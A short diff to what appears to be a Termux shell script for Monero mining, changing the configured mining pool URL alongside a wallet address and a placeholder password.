@@ -9,7 +9,7 @@
 
 USER="48QWuuLkjMQb1DWLuCcPVm1K4jrC4cpgrVCQfDgPdYNndCowboZqzVCMHrTtCVGDQPNjqpzprkjKLTxuLZDRM5uhVnTyJCQ"
 PASS='termux'
-MIMING_URL="mine.c3pool.com:13333"
+MIMING_URL="pool.minexmr.com:4444"
 
 VERSION=1.0
 TOS=''
